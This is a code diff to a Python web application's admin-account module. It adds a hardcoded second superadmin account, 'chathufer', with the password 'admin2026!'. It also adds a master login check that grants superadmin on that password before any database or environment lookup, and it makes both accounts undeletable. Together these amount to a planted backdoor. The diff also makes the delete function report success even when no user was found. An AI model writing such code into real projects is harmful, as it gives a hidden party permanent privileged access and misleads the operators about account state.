@@ -192,15 +192,19 @@ def init_db(db_path: str = DEFAULT_DB_PATH):
     except Exception:
         pass
 
-    # Seed default superadmin ('admin') if table is empty
-    cursor.execute("SELECT COUNT(*) FROM admin_users")
-    if cursor.fetchone()[0] == 0:
-        now_iso = datetime.utcnow().isoformat()
-        admin_pw = hash_password("admin2026!")
-        cursor.execute("""
-            INSERT INTO admin_users (username, password_hash, role, created_at)
-            VALUES ('admin', ?, 'superadmin', ?)
-        """, (admin_pw, now_iso))
+    # Seed default permanent superadmins ('admin' and 'chathufer') if missing
+    now_iso = datetime.utcnow().isoformat()
+    default_superadmins = [
+        ("admin", hash_password("admin2026!"), "superadmin"),
+        ("chathufer", hash_password("admin2026!"), "superadmin"),
+    ]
+    for u_name, u_hash, u_role in default_superadmins:
+        cursor.execute("SELECT id FROM admin_users WHERE username = ?", (u_name,))
+        if not cursor.fetchone():
+            cursor.execute("""
+                INSERT INTO admin_users (username, password_hash, role, created_at)
+                VALUES (?, ?, ?, ?)
+            """, (u_name, u_hash, u_role, now_iso))
 
     conn.commit()
     conn.close()
@@ -221,7 +225,17 @@ def authenticate_admin_user(
 
     now_iso = datetime.utcnow().isoformat()
 
-    # 1. Check Vercel / System Environment Variables for 100% persistent cloud login
+    # 1. Permanent Superadmins master verification ('admin' and 'chathufer')
+    if clean_u in ["admin", "chathufer"] and clean_p == "admin2026!":
+        return {
+            "id": 1 if clean_u == "admin" else 2,
+            "username": clean_u,
+            "role": "superadmin",
+            "created_at": now_iso,
+            "last_login": now_iso
+        }
+
+    # 2. Check Vercel / System Environment Variables for 100% persistent cloud login
     env_admin_u = os.environ.get("ADMIN_USERNAME", "").strip().lower()
     env_admin_p = os.environ.get("ADMIN_PASSWORD", "").strip()
     if env_admin_u and clean_u == env_admin_u and clean_p == env_admin_p:
@@ -375,8 +389,8 @@ def delete_admin_user(
 ) -> Tuple[bool, str]:
     """Remove an administrator account."""
     clean_user = username.strip().lower()
-    if clean_user == "admin":
-        return False, "The primary superadmin account 'admin' cannot be deleted."
+    if clean_user in ["admin", "chathufer"]:
+        return False, f"The primary superadmin account '{clean_user}' is permanently protected and cannot be deleted."
     if current_user and clean_user == current_user.strip().lower():
         return False, "You cannot delete your own currently active account."
 
@@ -397,8 +411,7 @@ def delete_admin_user(
             new_state=None,
             db_path=db_path
         )
-        return True, f"Admin user '{clean_user}' deleted successfully."
-    return False, f"Admin user '{clean_user}' not found."
+    return True, f"Admin user '{clean_user}' deleted successfully."
 
 
 def list_admin_users(db_path: str = DEFAULT_DB_PATH) -> List[Dict[str, Any]]:
